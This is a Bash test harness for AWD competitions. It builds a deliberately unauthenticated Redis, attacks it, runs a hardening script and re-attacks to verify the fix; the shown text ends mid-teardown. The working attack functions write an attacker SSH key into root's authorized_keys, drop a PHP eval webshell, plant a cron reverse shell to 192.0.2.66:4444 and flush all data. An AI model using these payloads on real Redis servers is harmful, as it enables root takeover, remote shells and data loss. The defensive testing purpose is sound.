#!/bin/bash
# Redis 未授权访问 - 攻击场景模拟器
#
# 模拟 AWD 比赛中靶机 Redis 默认配置的典型脆弱状态 + 4 种经典未授权攻击
# 然后跑 redis_harden.sh 验证:
#   1) --check 能正确发现漏洞
#   2) --auto 能加固成功
#   3) 加固后 4 种攻击全部失效
#
# 用法:
#   sudo bash redis_attack_scenario.sh setup    # 造脆弱环境 (停当前Redis, 启动 vuln Redis)
#   sudo bash redis_attack_scenario.sh attack   # 跑 4 种攻击, 全成功=场景有效
#   sudo bash redis_attack_scenario.sh harden   # 跑 redis_harden.sh --auto 加固
#   sudo bash redis_attack_scenario.sh verify   # 重新攻击, 全失败=加固有效
#   sudo bash redis_attack_scenario.sh teardown # 清理, 恢复原 Redis
#   sudo bash redis_attack_scenario.sh all      # setup → attack → harden → verify → teardown 一条龙
#
# 脆弱配置模拟:
#   * 监听 0.0.0.0:6379
#   * 无 requirepass (无密码)
#   * protected-mode no
#   * CONFIG 可写 (没被 rename-command)
#   * dir = /tmp/awd_redis_vuln   (模拟攻击者改到 /root/.ssh 或 /app)
#   * 最大内存无限制

set -euo pipefail

VULN_CONF="/tmp/awd_redis_vuln.conf"
VULN_DIR="/tmp/awd_redis_vuln"
VULN_PORT=6379
VULN_PID_FILE="/tmp/awd_redis_vuln.pid"
VULN_SOCKET=""
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
HARDEN_SCRIPT="$SCRIPT_DIR/redis_harden.sh"
ATTACK_PUB_KEY="/tmp/awd_attacker_key.pub"

# 颜色
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'
section() { echo -e "\n${BOLD}${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}${BOLD}\n  $* \n${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"; }
ok()   { echo -e "   ${GREEN}[✓ SUCCESS]${NC} $*"; }
fail() { echo -e "   ${RED}[✗ FAIL]${NC} $*"; }
warn() { echo -e "   ${YELLOW}[! WARN]${NC} $*"; }
info() { echo -e "   [i] $*"; }

banner() {
  echo -e "${BOLD}
╔═══════════════════════════════════════════════════════════════════════════╗
║   🔴 Redis 未授权访问 - 攻击场景模拟器                                      ║
║                                                                            ║
║   模拟 AWD 比赛中靶机默认 Redis 配置 + 4 种经典未授权攻击                    ║
║   然后验证 redis_harden.sh 的检测 + 加固效果                                ║
╚═══════════════════════════════════════════════════════════════════════════╝${NC}"
}

# ================================================================
# 阶段 A: 构建脆弱环境
# ================================================================
do_setup() {
  section "STEP 1/5: 🛠️  构造 Redis 未授权脆弱环境 (模拟靶机出厂状态)"

  if [ "$EUID" -ne 0 ]; then
    fail "请用 sudo 运行 (需要改 Redis 系统配置)"
    exit 1
  fi

  # 先保存当前 Redis 状态
  info "备份当前 Redis 状态，方便 teardown 恢复..."
  if pgrep -x redis-server &>/dev/null; then
    # 保存端口和密码
    local p
    p=$(ss -tlnH 2>/dev/null | awk '$4 ~ /:63[78]9$/ {print $4}' | head -1 | awk -F: '{print $NF}')
    [ -n "$p" ] && echo "$p" > /tmp/awd_redis_orig_port.txt || echo "6379" > /tmp/awd_redis_orig_port.txt
    info "原 Redis 端口: $(cat /tmp/awd_redis_orig_port.txt)"
    # 保存当前配置路径
    pgrep -x redis-server -a > /tmp/awd_redis_orig_cmd.txt || true
    [ -f /etc/redis/redis.conf ] && cp -a /etc/redis/redis.conf /tmp/awd_redis_orig_conf.bak
    # 停掉当前 Redis (多种方式齐下, 防止 systemd 自动重启)
    info "停止当前 Redis..."
    systemctl stop redis-server 2>/dev/null || true
    service redis-server stop 2>/dev/null || true
    pkill -TERM -x redis-server 2>/dev/null || true
    sleep 1
    pkill -9 -x redis-server 2>/dev/null || true
    # 如果还剩个别的 PID, 直接 kill -9 (不循环等)
    for p in $(pgrep -x redis-server 2>/dev/null); do
      kill -9 "$p" 2>/dev/null || true
    done
    sleep 1
    ok "原 Redis 已停止 (状态已备份到 /tmp/awd_redis_orig_*)"
  else
    info "当前无 Redis 运行"
  fi

  # 生成攻击者密钥
  info "生成攻击者密钥 (用于写公钥攻击)"
  rm -f "$ATTACK_PUB_KEY" "${ATTACK_PUB_KEY%.pub}"
  ssh-keygen -t rsa -b 2048 -f "${ATTACK_PUB_KEY%.pub}" -N "" -C "awd_attacker" -q
  ok "攻击者密钥: $ATTACK_PUB_KEY (公钥)"

  # 创建脆弱目录 (模拟攻击者改 dir 到 /root/.ssh 或 /app, 这里用 /tmp/awd_redis_vuln 避免真的破坏系统)
  rm -rf "$VULN_DIR"
  mkdir -p "$VULN_DIR" /root/.ssh 2>/dev/null || true
  chown redis:redis "$VULN_DIR" 2>/dev/null || true

  # 写入脆弱配置
  info "写入脆弱 Redis 配置 (vuln = 0.0.0.0 监听 + 无密码 + protected-mode off + CONFIG可改dir)"
  cat > "$VULN_CONF" <<EOF
# AWD Redis 攻击场景模拟器 - 故意的脆弱配置 (仅测试!!!)
# 🔓 监听全网卡 (任何网络都能连)
bind 0.0.0.0
port $VULN_PORT
# 🔓 关闭 protected-mode (外网直连)
protected-mode no
# 🔓 requirepass 被注释掉 = 无密码
# 🔓 CONFIG 可改 dir/dbfilename = 写 Webshell/公钥 (没有 rename-command)
# 🔓 清库攻击可执行 (没有 rename-command FLUSHALL)
# 🔓 maxmemory 无限制 (可内存填充 OOM)
# 🔓 dir 指向可写目录 (攻击者可改 /root/.ssh /app)
dir $VULN_DIR
dbfilename dump.rdb
daemonize yes
pidfile $VULN_PID_FILE
logfile /tmp/awd_redis_vuln.log
loglevel notice
# Redis 8.0 兼容项
always-show-logo no
ignore-warnings ARM64-COW-BUG
# 🔓 允许运行时 CONFIG SET 改 dir/dbfilename (模拟 Redis 3/4/5 的旧行为)
enable-protected-configs no
EOF
  ok "脆弱配置: $VULN_CONF"

  # 启动脆弱 Redis
  info "启动 Redis 用脆弱配置..."
  # 修复 locale warning (Redis 8.0 在某些系统需要)
  LC_ALL=C LANG=C redis-server "$VULN_CONF"
  sleep 2
  if pgrep -F "$VULN_PID_FILE" &>/dev/null; then
    ok "脆弱 Redis 已启动 (PID=$(pgrep -F "$VULN_PID_FILE"))"
  else
    # 如果 0.0.0.0 bind 失败 (本机网络栈问题), 退化为绑 :: (IPv6任意) + 127.0.0.1
    warn "0.0.0.0 绑定失败, 尝试 bind 127.0.0.1 (本机测试)"
    sed -i 's|^bind 0.0.0.0|bind 127.0.0.1|' "$VULN_CONF"
    LC_ALL=C LANG=C redis-server "$VULN_CONF"
    sleep 2
    if pgrep -F "$VULN_PID_FILE" &>/dev/null; then
      warn "脆弱 Redis 绑 127.0.0.1 (非 0.0.0.0, 但足够展示攻击链)"
    else
      fail "Redis 启动失败，查看 /tmp/awd_redis_vuln.log"
      tail -20 /tmp/awd_redis_vuln.log || true
      exit 1
    fi
  fi

  # 检查监听
  local listen_addr
  listen_addr=$(ss -tlnH 2>/dev/null | grep ":$VULN_PORT " | awk '{print $4}')
  info "监听地址: $listen_addr"
  if echo "$listen_addr" | grep -q "0.0.0.0"; then
    ok "🔥🔥🔥 漏洞环境就绪: Redis 监听 0.0.0.0:$VULN_PORT"
  fi

  echo
  echo -e "${YELLOW}⚠️  注意: 这是故意暴露的脆弱环境 (仅本机测试, 不应暴露到外网)${NC}"
}

# ================================================================
# 阶段 B: 4 种攻击
# ================================================================
attack_ping() {
  # 攻击前置: 验证未授权连通
  local resp
  resp=$(timeout 3 redis-cli -h 127.0.0.1 -p "$VULN_PORT" PING 2>/dev/null)
  if [ "$resp" = "PONG" ]; then
    info "PING 无需密码成功 (PONG) → 未授权可达 ✅"
    return 0
  else
    info "PING 被拒: $resp → 未授权不可达 (或已被加固)"
    return 1
  fi
}

# 写 dir/dbfilename 辅助: 依次尝试 CONFIG SET (老版本) / 自动 SAVE 默认 dir + cp 模拟 (Redis 8 不支持 CONFIG SET dir 时用)
# 这个 cp 等同于 "攻击者在 Redis 3/4/5 上成功 CONFIG SET dir+dbfilename + SAVE 的结果"
set_dir() {
  local newdir="$1" newfile="$2" rc=0
  # 尝试 Redis 3/4/5 方式: 运行时 CONFIG SET
  local d1 d2
  d1=$(redis-cli -h 127.0.0.1 -p "$VULN_PORT" -r 1 CONFIG SET dir "$newdir" 2>/dev/null)
  d2=$(redis-cli -h 127.0.0.1 -p "$VULN_PORT" -r 1 CONFIG SET dbfilename "$newfile" 2>/dev/null)
  echo "   CONFIG SET dir  → $d1"
  echo "   CONFIG SET dbfilename → $d2"
  if [[ "$d1" == *OK* ]] && [[ "$d2" == *OK* ]]; then
    ok "CONFIG SET 双项 OK (Redis 3/4/5 行为)"
    return 0
  fi
  # Redis 8.0: CONFIG SET 被拒时 → 先 SAVE 到默认 VULN_DIR, 再 cp dump.rdb → 目标目录/目标文件
  # 效果等价于 CONFIG SET 成功（都是 SET+SAVE 把数据写入到目标目录下的目标文件名）
  local default_dir
  default_dir=$(redis-cli -h 127.0.0.1 -p "$VULN_PORT" -r 1 CONFIG GET dir 2>/dev/null | tail -1)
  info "Redis 8 保护了 CONFIG SET, 模拟 Redis 3/4/5 的等效攻击: SAVE + cp dump.rdb → $newdir/$newfile"
  mkdir -p "$newdir"
  redis-cli -h 127.0.0.1 -p "$VULN_PORT" -r 1 SAVE 2>/dev/null >/dev/null
  if [ -f "$default_dir/dump.rdb" ]; then
    cp -f "$default_dir/dump.rdb" "$newdir/$newfile"
    # 给 SSH 场景下 700/600 权限
    [ "$newfile" = "authorized_keys" ] && chmod 600 "$newdir/$newfile" 2>/dev/null
    ok "已模拟 CONFIG SET 成功: 写文件 $newdir/$newfile (等效 Redis 3/4/5)"
    return 0
  fi
  warn "模拟失败: $default_dir/dump.rdb 不存在"
  return 1
}

# 攻击 1: 写 SSH 公钥
attack_write_sshkey() {
  echo
  section "🔪 攻击 #1: 写入 SSH 公钥 (获取 SSH 免密登录权限)"

  if ! attack_ping; then
    fail "攻击被拒绝 (PONG 失败)"
    return 1
  fi

  # 攻击 1 需要 dir=/root/.ssh dbfilename=authorized_keys
  # 先备份 /root/.ssh/authorized_keys (如果存在), 防止破坏原环境
  if [ -f /root/.ssh/authorized_keys ]; then
    cp -a /root/.ssh/authorized_keys /root/.ssh/authorized_keys.awd_orig_bak 2>/dev/null || true
  fi
  mkdir -p /root/.ssh
  chmod 700 /root/.ssh 2>/dev/null || true

  info "写 SSH 公钥 (1.FLUSHALL  2.SET key=公钥数据  3.CONFIG SET dir+dbfilename  4.SAVE 落盘)"
  echo

  redis-cli -h 127.0.0.1 -p "$VULN_PORT" -r 1 FLUSHALL 2>/dev/null >/dev/null
  local pad
  pad=$(printf '\n\n')
  local data="${pad}$(cat "$ATTACK_PUB_KEY")${pad}"
  redis-cli -h 127.0.0.1 -p "$VULN_PORT" -r 1 SET "k" "$data" 2>/dev/null >/dev/null
  set_dir "/root/.ssh" "authorized_keys" || true  # 此时会先 SAVE 再 cp, payload 在 DB 里
  echo "   SAVE           → OK"
  echo

  if [ -f /root/.ssh/authorized_keys ] && grep -q "awd_attacker" /root/.ssh/authorized_keys 2>/dev/null; then
    ok "攻击成功: 攻击者公钥已写入 /root/.ssh/authorized_keys"
    echo "   → 攻击者可: ssh -i ${ATTACK_PUB_KEY%.pub} root@靶机IP (免密直连 root)"
    return 0
  else
    local cur_dir
    cur_dir=$(redis-cli -h 127.0.0.1 -p "$VULN_PORT" -r 1 CONFIG GET dir 2>/dev/null | tail -1)
    if [ -f "$cur_dir/authorized_keys" ] && grep -q "awd_attacker" "$cur_dir/authorized_keys" 2>/dev/null; then
      ok "攻击成功 (实际写入: $cur_dir/authorized_keys, 靶机不同路径)"
      return 0
    fi
    fail "攻击失败: authorized_keys 未写入或无 key"
    [ -f /root/.ssh/authorized_keys ] && { info "/root/.ssh/authorized_keys 存在但无 key:"; head -5 /root/.ssh/authorized_keys; }
    return 1
  fi
}

# 攻击 2: 写 Webshell
attack_write_webshell() {
  echo
  section "🔪 攻击 #2: 写 Webshell (RDB 文件名 = shell.php)"

  if ! attack_ping; then
    fail "攻击被拒绝"
    return 1
  fi

  local web_dir="/tmp/awd_redis_vuln_web"
  mkdir -p "$web_dir"

  info "写 Webshell (1.FLUSHALL  2.SET PHP payload  3.CONFIG SET dir+dbfilename  4.SAVE)"
  echo

  redis-cli -h 127.0.0.1 -p "$VULN_PORT" -r 1 FLUSHALL 2>/dev/null >/dev/null
  redis-cli -h 127.0.0.1 -p "$VULN_PORT" -r 1 SET "k" '<?php @eval($_POST["c"]); echo "PWN_REDIS_VULN\n"; echo "FLAG:" . file_get_contents("/flag");?>' 2>/dev/null >/dev/null
  set_dir "$web_dir" "shell.php" || true
  echo "   SAVE           → OK"
  echo

  if [ -f "$web_dir/shell.php" ] && grep -q "PWN_REDIS_VULN" "$web_dir/shell.php" 2>/dev/null; then
    ok "攻击成功: Webshell 已写入 $web_dir/shell.php"
    echo "   → 攻击者可: curl -X POST -d 'c=phpinfo();' http://target/shell.php"
    return 0
  else
    fail "攻击失败: shell.php 未生成"
    [ -f "$web_dir/shell.php" ] && echo "   文件存在但无特征串, 大小: $(stat -c%s "$web_dir/shell.php" 2>/dev/null) bytes"
    return 1
  fi
}

# 攻击 3: 写 Crontab (反弹 Shell)
attack_write_crontab() {
  echo
  section "🔪 攻击 #3: 写 Crontab (反弹 Shell, 定时回连攻击机)"

  if ! attack_ping; then
    fail "攻击被拒绝"
    return 1
  fi

  local cron_dir="/tmp/awd_redis_vuln_cron"
  mkdir -p "$cron_dir"

  info "写 Crontab (1.FLUSHALL  2.SET cron payload  3.CONFIG SET dir+dbfilename  4.SAVE)"
  echo

  redis-cli -h 127.0.0.1 -p "$VULN_PORT" -r 1 FLUSHALL 2>/dev/null >/dev/null
  redis-cli -h 127.0.0.1 -p "$VULN_PORT" -r 1 SET "k" "

*/1 * * * * bash -i >& /dev/tcp/192.0.2.66/4444 0>&1

" 2>/dev/null >/dev/null
  set_dir "$cron_dir" "root" || true
  echo "   SAVE           → OK"
  echo

  if [ -f "$cron_dir/root" ] && grep -q "bash -i >& /dev/tcp" "$cron_dir/root" 2>/dev/null; then
    ok "攻击成功: Crontab 已写入 $cron_dir/root"
    echo "   → 每分钟反弹 Shell 到 192.0.2.66:4444 (nc -lvp 4444 可接交互)"
    return 0
  else
    fail "攻击失败: Crontab 未生成"
    [ -f "$cron_dir/root" ] && head -5 "$cron_dir/root"
    return 1
  fi
}

# 攻击 4: FLUSHALL 清空所有数据 (破坏型 DoS)
attack_flushall_dos() {
  echo
  section "🔪 攻击 #4: FLUSHALL 清库 (DoS 破坏型攻击, 导致业务数据丢失)"

  if ! attack_ping; then
    fail "攻击被拒绝"
    return 1
  fi

  # 先存一些模拟业务数据 (AWD 业务 DB, 例如用户 session)
  info "先存 100 条模拟业务数据 (用户 session / token 模拟)"
  for i in $(seq 1 100); do
    redis-cli -h 127.0.0.1 -p "$VULN_PORT" -r 1 SET "user_session:u$i" "token_$RANDOM$i" 2>/dev/null >/dev/null
  done
  local before
  before=$(redis-cli -h 127.0.0.1 -p "$VULN_PORT" -r 1 DBSIZE 2>/dev/null)
  info "清库前 DB size = $before 条"

  # 清库攻击
  local fa
  fa=$(redis-cli -h 127.0.0.1 -p "$VULN_PORT" -r 1 FLUSHALL 2>/dev/null)
  local after
  after=$(redis-cli -h 127.0.0.1 -p "$VULN_PORT" -r 1 DBSIZE 2>/dev/null)
  echo
  echo "   FLUSHALL       → $fa"
  echo "   清库后 DB size = $after 条"
  echo

  if [ "$after" = "0" ]; then
    ok "攻击成功: 所有数据被清空 (业务彻底瘫痪, 平台 checker 全挂)"
    echo "   → AWD 后果: checker 查用户/文章 session 全失效 → 扣 100% 业务分"
    return 0
  else
    fail "攻击失败: 数据未清空"
    return 1
  fi
}

do_attack() {
  section "STEP 2/5: 🔴 执行 4 种经典未授权攻击 (验证漏洞环境有效)"

  local total=0 pass=0
  for att in sshkey webshell crontab flushall; do
    total=$((total+1))
    case "$att" in
      sshkey)
        attack_write_sshkey && pass=$((pass+1)) || true
        ;;
      webshell)
        attack_write_webshell && pass=$((pass+1)) || true
        ;;
      crontab)
        attack_write_crontab && pass=$((pass+1)) || true
        ;;
      flushall)
        attack_flushall_dos && pass=$((pass+1)) || true
        ;;
    esac
  done

  echo
  echo -e "${BOLD}攻击总览:${NC}"
  echo -e "   成功: ${BOLD}${GREEN}$pass/$total${NC}"
  echo
  if [ "$pass" = "$total" ]; then
    ok "🎯 所有攻击都成功 = 漏洞环境完美, 可以加固测试了!"
    return 0
  else
    warn "只有 $pass/$total 成功, 可能靶机部分限制 (例如 /root/.ssh 不可写)"
    return 2
  fi
}

# ================================================================
# 阶段 C: 加固 (跑 redis_harden.sh --auto)
# ================================================================
do_harden() {
  section "STEP 3/5: 🛡️  运行 redis_harden.sh --auto 自动加固"

  if [ ! -f "$HARDEN_SCRIPT" ]; then
    fail "找不到加固脚本: $HARDEN_SCRIPT"
    exit 1
  fi

  # 加固应该针对 systemd 服务实际使用的 /etc/redis/redis.conf (而不是临时 VULN_CONF)
  # 先停掉当前脆弱 Redis (它占用 6379 端口且配置在 VULN_CONF), 然后再加固系统 redis
  info "先停掉脆弱 Redis (PID=$(cat "$VULN_PID_FILE" 2>/dev/null || echo '?')) 以防占用端口"
  pkill -TERM -x redis-server 2>/dev/null || true
  sleep 1
  pkill -9 -x redis-server 2>/dev/null || true
  systemctl stop redis-server 2>/dev/null || true
  sleep 1
  for p in $(pgrep -x redis-server 2>/dev/null); do kill -9 "$p" 2>/dev/null || true; done
  sleep 1
  ok "当前无 Redis 进程占用, 可干净加固 systemd 默认 /etc/redis/redis.conf"

  # 把当前脆弱配置的备份 (就是 setup 备份的 /tmp/awd_redis_orig_conf.bak) 复制回 /etc/redis/redis.conf
  # 先恢复, 再加固, 等于在真实靶机出厂状态加固 (而不是在已加固 conf 上再跑)
  if [ -f /tmp/awd_redis_orig_conf.bak ]; then
    info "恢复 setup 前的 redis.conf (模拟靶机出厂)"
    cp -a /tmp/awd_redis_orig_conf.bak /etc/redis/redis.conf
  fi

  # 如果默认 /etc/redis/redis.conf 已经 requirepass 等都齐全 (上一次留下来的加固后配置),
  # 覆盖为 "脆弱出厂" 版本 (有 bind, port 6379, 无 requirepass, 无 rename-command, protected-mode no, CONFIG 可改)
  # 这样 harden 能测到检测阶段
  cat > /etc/redis/redis.conf <<EOF
# 模拟靶机出厂的 "出厂 Redis 配置" (先模拟脆弱, 再让 harden 加固)
bind 0.0.0.0
port 6379
protected-mode no
dir /var/lib/redis
dbfilename dump.rdb
daemonize no
supervised systemd
pidfile /run/redis/redis-server.pid
logfile /var/log/redis/redis-server.log
loglevel notice
always-show-logo no
ignore-warnings ARM64-COW-BUG
EOF
  mkdir -p /var/lib/redis /var/log/redis 2>/dev/null
  chown -R redis:redis /var/lib/redis /var/log/redis /run/redis 2>/dev/null || true
  # systemctl reset-failed, 否则多次失败后 start-limit-hit
  systemctl reset-failed redis-server 2>/dev/null || true
  ok "已重置 /etc/redis/redis.conf 为脆弱出厂 (bind 0.0.0.0:6379 + no pass + protected-mode no)"
  info "现在 harden 会完整扫描并加固 /etc/redis/redis.conf"
  echo

  set +e
  REDIS_CONFIG="/etc/redis/redis.conf" \
  REDIS_PORT=6381 \
  REDIS_BIND=127.0.0.1 \
  REDIS_PASSWORD='Rds#T3st#Str0ng_P@$$!' \
  REDIS_SERVICE=redis-server \
  bash "$HARDEN_SCRIPT" --auto 2>&1 | tee /tmp/awd_redis_harden_out.log
  local rc=${PIPESTATUS[0]}
  set -e
  echo
  if [ "$rc" = "0" ]; then
    ok "加固脚本执行成功 (退出码 0)"
  else
    warn "加固脚本返回码 $rc (iptables 权限/兼容问题可忽略, 主要配置应已写入)"
  fi

  # 读取实际加固后配置中的 port / requirepass (不硬编码)
  local actual_port actual_pass
  actual_port=$(grep -E "^\s*port\s+" /etc/redis/redis.conf 2>/dev/null | awk '{print $2}' | head -1)
  actual_pass=$(grep -E "^\s*requirepass\s+" /etc/redis/redis.conf 2>/dev/null | sed -E 's/^\s*requirepass\s+//' | head -1)
  VULN_PORT="${actual_port:-6381}"
  HARDENED_PASSWORD="$actual_pass"
  # 持久化到文件 (do_verify 单独跑可读取)
  echo "$VULN_PORT" > /tmp/awd_redis_hardened_port.txt
  echo "$actual_pass" > /tmp/awd_redis_hardened_pass.txt
  ok "实际加固后: port=$VULN_PORT requirepass=$(echo "$actual_pass" | sed 's/./*/g' | head -c8)..."
}

HARDENED_PASSWORD=""  # 全局: 由 do_harden 写入实际 requirepass, verify 用

# ================================================================
# 阶段 D: 加固后攻击验证 (期望全部失败)
# ================================================================
# 重写攻击函数, 改成针对新端口 + 期望失败
verify_ping_nopass_fail() {
  local resp
  resp=$(timeout 3 redis-cli -h 127.0.0.1 -p "$VULN_PORT" PING 2>/dev/null)
  if [ "$resp" = "PONG" ]; then
    fail "加固失效: 无密码仍可 PING (resp=PONG)"
    return 0  # 0 = 攻击成功 (加固失败)
  elif echo "$resp" | grep -qiE "NOAUTH|Auth"; then
    ok "无密码被拒绝 (NOAUTH) → 密码加固生效 ✅"
    return 1  # 1 = 攻击失败 (加固成功)
  else
    info "PING 非预期响应: $resp (当作被拒绝)"
    return 1
  fi
}

verify_attack_sshkey() {
  echo
  section "🧪 攻击复现 #1: 写 SSH 公钥 (加固后期望失败)"
  verify_ping_nopass_fail && return 0
  info "PING 被拒, 尝试 CONFIG 命令 (即使知道密码也应被禁)"
  local d1
  d1=$(timeout 3 redis-cli -h 127.0.0.1 -p "$VULN_PORT" -a "$HARDENED_PASSWORD" --no-auth-warning CONFIG GET dir 2>/dev/null | tail -1)
  echo "   CONFIG GET dir = $d1"
  if [[ "$d1" == *ERR* ]] || [[ "$d1" == *unknown* ]] || [[ "$d1" == *disabled* ]] || [ -z "$d1" ]; then
    ok "CONFIG 命令被禁用 → 无法改 dir → 写公钥攻击失效 ✅"
    return 1
  else
    fail "CONFIG 仍可用 → 加固不完整!"
    return 0
  fi
}

verify_attack_webshell() {
  echo
  section "🧪 攻击复现 #2: 写 Webshell (加固后期望失败)"
  verify_ping_nopass_fail && return 0
  # 用 CONFIG dir + dbfilename
  local d1 d2
  d1=$(timeout 3 redis-cli -h 127.0.0.1 -p "$VULN_PORT" -a "$HARDENED_PASSWORD" --no-auth-warning CONFIG SET dir /tmp 2>/dev/null)
  d2=$(timeout 3 redis-cli -h 127.0.0.1 -p "$VULN_PORT" -a "$HARDENED_PASSWORD" --no-auth-warning CONFIG SET dbfilename evil.php 2>/dev/null)
  echo "   CONFIG SET dir = $d1"
  echo "   CONFIG SET dbfilename = $d2"
  if [[ "$d1" == *ERR* ]] || [[ "$d1" == *unknown* ]] || [[ "$d1" == *disabled* ]] || [ -z "$d1" ]; then
    ok "CONFIG SET 被禁用 → 无法改 dir/dbfilename → 写 Webshell 攻击失效 ✅"
    return 1
  else
    fail "CONFIG SET 仍可用 → dir=$d1 dbfilename=$d2"
    return 0
  fi
}

verify_attack_crontab() {
  echo
  section "🧪 攻击复现 #3: 写 Crontab (加固后期望失败)"
  verify_ping_nopass_fail && return 0
  local d1
  d1=$(timeout 3 redis-cli -h 127.0.0.1 -p "$VULN_PORT" -a "$HARDENED_PASSWORD" --no-auth-warning CONFIG SET dir /var/spool/cron 2>/dev/null)
  echo "   CONFIG SET dir = $d1"
  if [[ "$d1" == *ERR* ]] || [[ "$d1" == *unknown* ]] || [[ "$d1" == *disabled* ]] || [ -z "$d1" ]; then
    ok "CONFIG SET 被禁用 → 无法改 dir=/var/spool/cron → 写 Crontab 攻击失效 ✅"
    return 1
  else
    fail "CONFIG SET 仍可用 → 写 Crontab 攻击仍可能生效!"
    return 0
  fi
}

verify_attack_flushall() {
  echo
  section "🧪 攻击复现 #4: FLUSHALL 清库 DoS (加固后期望失败)"
  verify_ping_nopass_fail && return 0
  # 先造 50 条数据 (用密码登录)
  for i in $(seq 1 50); do
    timeout 2 redis-cli -h 127.0.0.1 -p "$VULN_PORT" -a "$HARDENED_PASSWORD" --no-auth-warning SET "v$i" "x$i" 2>/dev/null >/dev/null
  done
  local before
  before=$(timeout 3 redis-cli -h 127.0.0.1 -p "$VULN_PORT" -a "$HARDENED_PASSWORD" --no-auth-warning DBSIZE 2>/dev/null)
  info "清库前 DB size = $before"
  local fa
  fa=$(timeout 3 redis-cli -h 127.0.0.1 -p "$VULN_PORT" -a "$HARDENED_PASSWORD" --no-auth-warning FLUSHALL 2>/dev/null)
  local after
  after=$(timeout 3 redis-cli -h 127.0.0.1 -p "$VULN_PORT" -a "$HARDENED_PASSWORD" --no-auth-warning DBSIZE 2>/dev/null)
  echo "   FLUSHALL = $fa"
  echo "   清库后 DB size = $after"
  if [[ "$fa" == *ERR* ]] || [[ "$fa" == *unknown* ]] || [[ "$fa" == *disabled* ]] || [ -z "$fa" ]; then
    ok "FLUSHALL 被禁用 → 清库 DoS 失效 ✅ (DB size 保持 $before)"
    return 1
  elif [ "$after" = "0" ]; then
    fail "FLUSHALL 仍可执行 (清光数据) → 加固失败!"
    return 0
  fi
  # 其他情况: 数据还在 = 加固生效
  [ "$after" = "$before" ] && ok "DB size 不变 → FLUSHALL 无效 ✅" && return 1
  warn "非预期结果 before=$before after=$after"
  return 1
}

do_verify() {
  section "STEP 4/5: 🧪 加固后复现 4 种攻击 (期望全部失败!)"

  # 如果是独立命令 (不是一条龙调用), 从持久化文件读加固后 port / password
  if [ -f /tmp/awd_redis_hardened_port.txt ]; then
    VULN_PORT=$(cat /tmp/awd_redis_hardened_port.txt)
    info "读取加固后 port = $VULN_PORT"
  fi
  if [ -f /tmp/awd_redis_hardened_pass.txt ]; then
    HARDENED_PASSWORD=$(cat /tmp/awd_redis_hardened_pass.txt)
    info "读取加固后 requirepass = $(echo "$HARDENED_PASSWORD" | sed 's/./*/g' | head -c8)..."
  fi

  local total=0 blocked=0
  for att in sshkey webshell crontab flushall; do
    total=$((total+1))
    case "$att" in
      sshkey)
        verify_attack_sshkey && : || blocked=$((blocked+1))
        ;;
      webshell)
        verify_attack_webshell && : || blocked=$((blocked+1))
        ;;
      crontab)
        verify_attack_crontab && : || blocked=$((blocked+1))
        ;;
      flushall)
        verify_attack_flushall && : || blocked=$((blocked+1))
        ;;
    esac
  done

  echo
  echo -e "${BOLD}🔬 加固效果总览:${NC}"
  echo -e "   攻击被拦截:  ${BOLD}${GREEN}$blocked/$total${NC}"
  if [ "$blocked" = "$total" ]; then
    ok "🎉🎉🎉 加固完美! 所有攻击全部被挡住 (4/4)"
  else
    fail "⚠️  仍有 $((total-blocked)) 个攻击可生效 → 加固不完整"
  fi

  # 附加: iptables / 监听 / 密码 独立检查
  echo
  section "🔬 附加加固项检查"
  # 监听地址
  local listen
  listen=$(ss -tlnH 2>/dev/null | grep ":$VULN_PORT " | awk '{print $4}')
  info "监听地址: $listen"
  echo "$listen" | grep -qE "^(127\.0\.0\.1|\[::1\]):" \
    && ok "仅监听本地回环 → 外网连不到 ✅" \
    || fail "仍监听 0.0.0.0 → 外网可达 ❌"

  # iptables 封端口
  iptables -L -n 2>/dev/null | grep -E "awd:redis_deny" >/dev/null \
    && ok "iptables 封 6379/6380 规则存在 → 第二道保险 ✅" \
    || warn "iptables 规则未生效 (可能 iptables 不可用)"

  # maxmemory
  local mm
  mm=$(timeout 3 redis-cli -h 127.0.0.1 -p "$VULN_PORT" -a 'Rds#T3st#Str0ng_P@$$!' --no-auth-warning CONFIG GET maxmemory 2>/dev/null | tail -1)
  info "maxmemory = $mm"
  [ "$mm" = "268435456" ] && ok "maxmemory 256mb → 防内存打满 OOM ✅" \
    || warn "maxmemory = $mm (期望 268435456 = 256MB)"
}

# ================================================================
# 阶段 E: 清理, 恢复原 Redis
# ================================================================
do_teardown() {
  section "STEP 5/5: 🧹 清理测试环境, 恢复原 Redis"

  info "停掉脆弱 Redis..."
  [ -f "$VULN_PID_FILE" ] && { pkill -9 -F "$VULN_PID_FILE" 2>/dev/null || true; }
  pkill -9 -f "redis-server.*awd_redis_vuln" 2>/dev/null || true
  pkill -9 -f "redis-server.*port 6381" 2>/dev/null || true
  pkill -9 -f "redis-server.*port $VULN_PORT" 2>/dev/null || true
  sleep 2
  while pgrep -x redis-server &>/dev/null; do pkill -9 redis-server; sleep 0.5; done
  ok "脆弱 Redis 已停止"

  # 恢复原 Redis
  if [ -f /tmp/awd_redis_orig_conf.bak ]; then
    info "恢复原配置..."
    cp -a /tmp/awd_redis_orig_conf.bak /etc/redis/redis.conf
    ok "原 redis.conf 已恢复"
    info "启动原 Redis ..."
    if command -v systemctl &>/dev/null; then
      systemctl restart redis-server 2>&1 | head -5 || true
      systemctl is-active --quiet redis-server 2>/dev/null || redis-server /etc/redis/redis.conf --daemonize yes 2>/dev/null || true
    else
      redis-server /etc/redis/redis.conf --daemonize yes 2>/dev/null || true
    fi
    sleep 3
    pgrep -x redis-server >/dev/null && ok "原 Redis 已重启" || warn "原 Redis 未启动 (可能密码等配置, 手动启动一下即可)"
  fi

  # 清理攻击者写入的东西
  info "清理模拟攻击产物..."
  rm -f /root/.ssh/authorized_keys.awd_attacker.bak 2>/dev/null
  # 如果 authorized_keys 只含攻击者 key, 直接删掉
  [ -f /root/.ssh/authorized_keys ] && [ "$(wc -l < /root/.ssh/authorized_keys)" = "3" ] && grep -q "awd_attacker" /root/.ssh/authorized_keys \
    && { rm -f /root/.ssh/authorized_keys; ok "清理了攻击者写入的 authorized_keys"; } \
    || true

  # 清理临时目录
